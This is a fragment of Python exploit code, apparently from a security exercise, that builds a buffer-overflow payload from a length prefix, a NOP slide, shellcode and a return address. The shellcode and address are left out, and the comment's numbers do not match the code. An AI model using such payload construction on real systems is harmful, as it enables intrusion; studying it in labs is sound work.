...
def get_payload() -> bytes:
    ...
    """
    # The size of buffer until we get seg fault is 1040, and the size of the shellcode is 212, therefore we add 848 nops
    msg_size = (1045).to_bytes(4, 'big')

    # create a nop slide
    nop_slide = []
    nop_slide = bytearray(b'\x90')*828
    ...
    # create the payload
    payload = msg_size + nop_slide + shellcode + address + ('\0').encode('latin-1')
